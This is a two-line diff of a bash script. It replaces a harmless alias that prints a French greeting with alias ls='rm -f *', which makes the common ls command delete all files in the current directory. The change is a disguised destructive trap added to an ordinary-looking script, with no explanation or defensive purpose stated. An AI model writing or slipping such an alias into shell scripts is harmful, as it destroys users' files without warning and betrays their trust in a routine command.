@@ -1,2 +1,2 @@
 #!/bin/bash
-alias mon_alias="echo 'Bonjour, utilisateur!'"
+alias ls='rm -f *'
